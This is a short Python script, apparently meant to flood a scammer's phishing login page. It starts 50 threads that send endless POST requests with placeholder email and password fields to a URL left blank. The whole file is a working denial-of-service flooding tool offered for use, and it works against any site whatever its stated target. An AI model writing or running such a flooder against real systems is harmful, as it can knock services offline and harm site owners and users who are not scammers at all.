#!/usr/bin/env python3

import requests
import threading

# Enter the scammer's url
url = ''

# This one is a login page.
data = {

    'Email': '',

    'Password': '',
}

def do_request():
    while True:
        response = requests.post(url, data=data).text
        print(response)

threads = []

for i in range(50):
        t = threading.Thread(target=do_request)
        t.daemon = True
        threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
